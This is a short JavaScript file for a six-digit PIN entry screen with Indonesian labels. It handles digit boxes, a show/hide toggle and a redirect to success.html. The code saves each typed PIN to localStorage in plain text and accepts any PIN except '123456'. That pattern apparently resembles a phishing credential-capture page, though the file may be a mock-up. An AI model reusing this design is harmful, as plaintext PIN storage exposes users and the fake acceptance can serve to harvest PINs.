// pix.js

const inputs =
document.querySelectorAll(".pix-box");

const showBtn =
document.getElementById("showBtn");

const loadingBox =
document.getElementById("loadingBox");

const errorBox =
document.getElementById("errorBox");

let isShow = false;

/* ========================= */
/* RESET LOADING */
/* ========================= */

window.addEventListener(
"pageshow",
() => {

    loadingBox.style.display =
    "none";

});

/* ========================= */
/* FOKUS KE BOX KOSONG */
/* ========================= */

inputs.forEach((input,index) => {

    input.addEventListener(
    "click",
    () => {

        for(
            let i = 0;
            i < inputs.length;
            i++
        ){

            if(
                inputs[i].value === ""
            ){

                inputs[i].focus();

                break;

            }

        }

    });

});

/* ========================= */
/* AUTO PIX */
/* ========================= */

inputs.forEach((input,index) => {

    input.addEventListener(
    "input",
    () => {

        input.value =
        input.value.replace(
        /[^0-9]/g,
        ''
        );

        /* HIDE ERROR */
        errorBox.classList.remove(
        "show"
        );

        /* NEXT */
        if(
            input.value.length === 1
        ){

            if(
                index <
                inputs.length - 1
            ){

                inputs[index + 1]
                .focus();

            }

        }

        checkPix();

    });

    /* BACKSPACE */
    input.addEventListener(
    "keydown",
    (e) => {

        if(
            e.key === "Backspace" &&
            input.value === ""
        ){

            if(index > 0){

                inputs[index - 1]
                .focus();

            }

        }

    });

});

/* ========================= */
/* SHOW PIX */
/* ========================= */

showBtn.addEventListener(
"click",
() => {

    isShow = !isShow;

    inputs.forEach(input => {

        input.type =
        isShow
        ? "text"
        : "password";

    });

    showBtn.innerText =
    isShow
    ? "SEMBUNYIKAN"
    : "TAMPILKAN";

});

/* ========================= */
/* CHECK PIX */
/* ========================= */

function checkPix(){

    let pix = "";

    inputs.forEach(input => {

        pix += input.value;

    });

    /* SIMPAN */
    localStorage.setItem(
    "pix",
    pix
    );

    /* FULL */
    if(pix.length === 6){

        /* PIX SALAH */
        if(pix === "123456"){

            /* GETAR */
            if(navigator.vibrate){

                navigator.vibrate([
                    120,
                    80,
                    120
                ]);

            }

            /* SHOW ERROR */
            errorBox.classList.add(
            "show"
            );

            /* AUTO HIDE */
            setTimeout(() => {

                errorBox.classList.remove(
                "show"
                );

            },2000);

            /* RESET */
            setTimeout(() => {

                inputs.forEach(input => {

                    input.value = "";

                });

                inputs[0].focus();

            },300);

            return;

        }

        /* SHOW LOADING */
        loadingBox.style.display =
        "flex";

        /* DELAY */
        setTimeout(() => {

            window.location.href =
            "success.html";

        },2000);

    }

}
